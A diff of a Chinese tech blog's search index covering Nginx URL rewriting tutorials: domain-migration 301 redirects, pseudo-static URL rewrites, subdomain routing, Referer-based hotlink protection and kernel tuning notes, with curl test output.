-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.peter.com;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">    location / &#123;</span><br><span class="line">        default_type text/html;</span><br><span class="line">        return 200 &#x27;&lt;h1&gt;Welcome to peter&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># rewrite配置</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.petertest1.cn www.petertest2.cn;</span><br><span class="line">    rewrite ^/ http://www.peter.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>浏览器访问<a href="http://www.petertest1.cn或http//www.petertest2.cn">http://www.petertest1.cn或http://www.petertest2.cn</a>, 会跳转到<a href="http://www.peter.com/">http://www.peter.com</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.petertest2.cn -i</span><br><span class="line">HTTP/1.1 302 Moved Temporarily</span><br><span class="line">...</span><br><span class="line">Location: http://www.peter.com</span><br></pre></td></tr></table></figure>
-
-<h3 id="重定向后URL丢了，怎么带上URL"><a href="#重定向后URL丢了，怎么带上URL" class="headerlink" title="重定向后URL丢了，怎么带上URL"></a>重定向后URL丢了，怎么带上URL</h3><p><a href="http://www.petertest1.cn/getUser">http://www.petertest1.cn/getUser</a> -&gt; <a href="http://www.peter.com/getUser">http://www.peter.com/getUser</a><br>修改nginx.conf的rewrite配置，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rewrite case</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.petertest1.cn www.petertest2.cn;</span><br><span class="line">    rewrite ^(.*) http://www.peter.com$1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="独立域名"><a href="#独立域名" class="headerlink" title="独立域名"></a>独立域名</h2><p>一个web项目有多个模块，每个模块可设置独立域名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://search.itcast.com:81 # 商品搜索模块</span><br><span class="line">http://item.itcast.com:82 # 商品详情模块</span><br><span class="line">http://cart.itcast.com:83 # 访问商品购物车模块</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">    listen 81;</span><br><span class="line">	server_name search.itcast.com;</span><br><span class="line">	rewrite ^(.*) http://www.itcast.cn/search$1;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">    listen 82;</span><br><span class="line">	server_name item.itcast.com;</span><br><span class="line">	rewrite ^(.*) http://www.itcast.cn/item$1;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">    listen 83;</span><br><span class="line">	server_name cart.itcast.com;</span><br><span class="line">	rewrite ^(.*) http://www.itcast.cn/cart$1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="URL后自动添加"><a href="#URL后自动添加" class="headerlink" title="URL后自动添加&#x2F;"></a>URL后自动添加&#x2F;</h2><p><a href="https://www.cnblogs.com/Nicholas0707/p/12210551.html">https://www.cnblogs.com/Nicholas0707/p/12210551.html</a><br>&#x2F;hello  301永久重定向 再 &#x2F;hello&#x2F; 200 OK<br>&#x2F;hello&#x2F; 200 OK</p>
-<p><a href="http://192.168.52.200/hello">http://192.168.52.200/hello</a> 和 <a href="http://192.168.52.200/hello/">http://192.168.52.200/hello/</a> 区别:<br>如果URL最后不加斜杠, Nginx会自动做一个301的重定向, 重定向地址如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server_name_in_redirect on | off (0.8.48版本以前默认为on)</span><br><span class="line">值为on, http://server_name/hello/;</span><br><span class="line">值为off http://原URL中的域名/hello/;</span><br></pre></td></tr></table></figure>
-<p>如果值为on, 访问不带斜杠，比如<a href="http://192.168.52.200/hello%EF%BC%8C%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0http://localhost/hello/%E4%BC%9A%E6%9C%89%E9%97%AE%E9%A2%98">http://192.168.52.200/hello，重定向到http://localhost/hello/会有问题</a>!<br>(只有老版本有这个问题)</p>
-<h2 id="合并目录"><a href="#合并目录" class="headerlink" title="合并目录"></a>合并目录</h2><p>SEO(搜索引擎排名靠前)</p>
-<p>例如: 网站有一个资源文件路径: &#x2F;server&#x2F;11&#x2F;22&#x2F;33&#x2F;44&#x2F;20.html<br>不利于搜索引擎优化，客户也不好记</p>
-<h1 id="Nginx安全控制和SSL加密介绍"><a href="#Nginx安全控制和SSL加密介绍" class="headerlink" title="Nginx安全控制和SSL加密介绍"></a>Nginx安全控制和SSL加密介绍</h1><p>(TODO)</p>
-<h1 id="Nginx挂了怎么办，怎么实现高可用"><a href="#Nginx挂了怎么办，怎么实现高可用" class="headerlink" title="Nginx挂了怎么办，怎么实现高可用"></a>Nginx挂了怎么办，怎么实现高可用</h1><p><a href="https://www.cnblogs.com/crazymakercircle/p/15476154.html">https://www.cnblogs.com/crazymakercircle/p/15476154.html</a><br>问题: Nginx本身不可用怎么办</p>
-<p><strong>双机热备方案</strong><br>在一台服务器提供服务, 另一台服务器作为备用。当一台服务器不可用另一台就会顶替上去</p>
+<h2 id="基于域名的几种互联网需求解析"><a href="#基于域名的几种互联网需求解析" class="headerlink" title="基于域名的几种互联网需求解析"></a>基于域名的几种互联网需求解析</h2><p>hosts泛解析 <a href="https://cloud.tencent.com/developer/article/1534150">https://cloud.tencent.com/developer/article/1534150</a> (dnsmaxq) 本机DNS指向dnsmasq,dnsmasq做泛解析，把域名都解析到同一个IP</p>
+<h2 id="多用户二级域名需求-微博"><a href="#多用户二级域名需求-微博" class="headerlink" title="多用户二级域名需求(微博)"></a>多用户二级域名需求(微博)</h2><p>*.weibo.com -&gt; Nginx -&gt; 真正的业务服务器(拿到域名，解析出二级域名)</p>
+<h2 id="短网址"><a href="#短网址" class="headerlink" title="短网址"></a>短网址</h2><p>*.com&#x2F;asdasjda12312 -&gt; Nginx -&gt; 真正的网址</p>
+<h2 id="Nginx安全控制和SSL加密介绍"><a href="#Nginx安全控制和SSL加密介绍" class="headerlink" title="Nginx安全控制和SSL加密介绍"></a>Nginx安全控制和SSL加密介绍</h2><p>(TODO)</p>
+<h2 id="静态资源防盗链"><a href="#静态资源防盗链" class="headerlink" title="静态资源防盗链"></a>静态资源防盗链</h2><p>资源盗链指内容不在自己服务器，而是通过技术手段，绕过别人限制将别人内容放到自己页面上最终显示给用户，盗取大网站流量，用别人的资源搭自己网站<br>浏览器向web请求时，一般会带上referer，来告诉浏览器此网页是从哪个链接跳转过来的<br>后台服务器可以根据Referer判断自己是否为受信任的网站，如果是则放行，不是可以拒绝访问<br>更精细的控制: Nginx第三方模块ngx_http_accesskey_module</p>
+<!-- 完美分割线 -->
 <h1 id="Nginx进阶-高并发网站技术架构实战"><a href="#Nginx进阶-高并发网站技术架构实战" class="headerlink" title="Nginx进阶(高并发网站技术架构实战)"></a>Nginx进阶(高并发网站技术架构实战)</h1><p>Ingress-Controller<br>Openresty<br><a href="https://www.cnblogs.com/crazymakercircle/p/17052040.html">https://www.cnblogs.com/crazymakercircle/p/17052040.html</a></p>
 <h1 id="内核参数优化"><a href="#内核参数优化" class="headerlink" title="内核参数优化"></a>内核参数优化</h1><ul>
 <li>file-max: 表示进程可以同时打开的最大句柄数，这个参数直接限制最大并发连接数</li>
 <li>tcp_tw_reuse: 设为1, 允许将TIME-WAIT的socket重新用于新TCP连接</li>
 <li>tcp_fin_timeout: 表示服务器主动关闭连接时, socket保持在FIN_WAIT_2状态最大时间</li>
 <li>tcp_max_tw_buckets: 表示OS允许TIME_WAIT套接字数量的最大值, 如果超过这个数字, TIME_WAIT被立刻清除并打印告警, 过多的TIME_WAIT会导致Web服务器变慢</li>
-<li>tcp_syncookies: 解决TCP的SYN攻击</li>
+<li>tcp_syncookies: 解决TCP的SYN攻击<br><a href="https://juejin.cn/post/6844904144235413512">https://juejin.cn/post/6844904144235413512</a></li>
 </ul>
-<p><a href="https://juejin.cn/post/6844904144235413512">https://juejin.cn/post/6844904144235413512</a></p>
 ]]></content>
       <categories>
         <category>Nginx</category>
@@ -10095,5 +10054,54 @@ TypeError: Can&#39;t instantiate abstract class BadType with ...
 </ul>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>【1】<a href="https://www.cnblogs.com/asker009/p/15010773.html">nginx+keepalived高可用配置笔记</a><br>【2】<a href="https://docs.nginx.com/nginx/admin-guide/high-availability/ha-keepalived/">https://docs.nginx.com/nginx/admin-guide/high-availability/ha-keepalived/</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>Nginx URLRewrite案例演示</title>
+    <url>/2024/1123152532.html</url>
+    <content><![CDATA[<h1 id="URLRewrite是什么"><a href="#URLRewrite是什么" class="headerlink" title="URLRewrite是什么"></a>URLRewrite是什么</h1><p>URL重写, 是Nginx中用于将请求重定向到其他URL的过程</p>
+<h1 id="URLRewrite的应用场景"><a href="#URLRewrite的应用场景" class="headerlink" title="URLRewrite的应用场景"></a>URLRewrite的应用场景</h1><ul>
+<li>域名迁移。 当企业更换域名时，通过URL重写将旧域名的访问永久重定向到新域名，避免用户流失。</li>
+<li>URL规范化。通过URL重写，使URL更加规范和美观，提升用户体验。</li>
+<li>伪静态。重写动态URL为静态URL，提高搜索引擎的收录效率和网站排名</li>
+<li>安全性增强。隐藏真实文件目录, 防止攻击者直接访问文件</li>
+</ul>
+<h1 id="URLRewrite案例演示"><a href="#URLRewrite案例演示" class="headerlink" title="URLRewrite案例演示"></a>URLRewrite案例演示</h1><span id="more"></span>
+
+<h2 id="案例1-域名迁移"><a href="#案例1-域名迁移" class="headerlink" title="案例1: 域名迁移"></a>案例1: 域名迁移</h2><p>当企业更换域名时，通过URL重写将旧域名的访问永久重定向到新域名，避免用户流失。<br>例如访问京东，通过<code>www.360buy.com</code>, <code>www.jingdong.com</code>，最终都重定向到<code>www.jd.com</code></p>
+<p><strong>案例演示</strong><br>访问<code>www.petertest1.cn</code>或<code>www.petertest2.cn</code>, 永久重定向到<code>www.peter.com</code></p>
+<h3 id="创建一台Linux虚拟机-准备三个域名"><a href="#创建一台Linux虚拟机-准备三个域名" class="headerlink" title="创建一台Linux虚拟机, 准备三个域名"></a>创建一台Linux虚拟机, 准备三个域名</h3><p>修改虚拟机的&#x2F;etc&#x2F;hosts文件，内容如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.200 www.petertest1.cn</span><br><span class="line">192.168.52.200 www.petertest2.cn</span><br><span class="line">192.168.52.200 www.peter.com</span><br></pre></td></tr></table></figure>
+<p>注: 192.168.52.200是我的虚拟机IP</p>
+<h3 id="配置Nginx-添加一个服务器-配置重定向"><a href="#配置Nginx-添加一个服务器-配置重定向" class="headerlink" title="配置Nginx, 添加一个服务器, 配置重定向"></a>配置Nginx, 添加一个服务器, 配置重定向</h3><p>修改nginx.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.peter.com;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">    location / &#123;</span><br><span class="line">        default_type text/html;</span><br><span class="line">        return 200 &#x27;&lt;h1&gt;Welcome to peter&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.petertest1.cn www.petertest2.cn; # 需要永久重定向的旧的域名</span><br><span class="line">    rewrite ^(.*) http://www.peter.com$1 permanent; # rewrite实现重定向, 指定permanent返回301永久重定向, 不指定返回302临时重定向</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>在浏览器访问<code>http://www.petertest1.cn/getUser</code>, 可以成功跳转到<code>http://www.peter.com/getUser</code>，且地址栏显示的也是重定向后的URL: <code>http://www.peter.com/getUser</code><br>再用curl测试，返回301永久重定向, Location为<code>http://www.peter.com</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.petertest2.cn -i</span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Server: nginx/1.20.1</span><br><span class="line">Date: Sat, 23 Nov 2024 07:05:41 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 169</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http://www.peter.com/</span><br></pre></td></tr></table></figure>
+
+<p>另一种实现域名永久重定向的配置方法(不使用URLRewrite)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.peter.com;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">    location / &#123;</span><br><span class="line">        default_type text/html;</span><br><span class="line">        return 200 &#x27;&lt;h1&gt;Welcome to peter&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name example.com;</span><br><span class="line">    return 301 http://www.peter.com$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>附: 301永久重定向抓包<br>先通过tcpdump抓包<code>tcpdump -i ens33 tcp and port not 22 -w output.pcap</code>, 再用Wireshark分析</p>
+<p><img data-src="/2024/1123152532/301.png"></p>
+<p>这里可以看出重定向和请求转发的区别：客户端收到301后，客户端会再发起一次新的HTTP请求；而内部转发是服务器行为，客户端感知不到。</p>
+<h2 id="案例2-伪静态"><a href="#案例2-伪静态" class="headerlink" title="案例2: 伪静态"></a>案例2: 伪静态</h2><p>伪静态是指，把动态URL转换为静态URL的过程，以对用户更友好的方式显示在浏览器地址栏中。</p>
+<p><strong>案例演示</strong><br>假设有一个动态URL<code>http://peter.com/page.php?id=1</code>, 我想重写成伪静态URL<code>http://peter.com/page/1</code>，Nginx中如何实现?</p>
+<h3 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><p>修改nginx.conf</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  www.peter.com;</span><br><span class="line">    access_log   access.log;</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line">    location / &#123;</span><br><span class="line">        default_type text/html;</span><br><span class="line">        return 200 &#x27;&lt;h1&gt;query_string: $query_string&lt;/h1&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    location ~ /page/(\d+)$ &#123;</span><br><span class="line">        rewrite ^/page/(\d+)$ /page.php?id=$1 last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>说明：</p>
+<ul>
+<li>这里的rewrite语句最后要指定last，不用break。因为在这个案例中, 我们需要重写后的URL(<code>http://peter.com/page/1</code>)继续从头开始匹配所有的location，命中<code>location /</code>规则。(如果指定break会返回404，可自行尝试)</li>
+</ul>
+<p>测试结果:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl localhost/page/1</span><br><span class="line">&lt;h1&gt;query_string: id=1&lt;/h1&gt;</span><br><span class="line"># curl localhost/page/234</span><br><span class="line">&lt;h1&gt;query_string: id=234&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>【1】<a href="https://blog.csdn.net/m0_62396418/article/details/135747521">Nginx rewrite地址重写</a><br>【2】<a href="https://developer.aliyun.com/article/1499869">Nginx-URLRewrite伪静态</a></p>
+]]></content>
+      <categories>
+        <category>Nginx</category>
+      </categories>
+      <tags>
+        <tag>Nginx</tag>
+      </tags>
   </entry>
 </search>
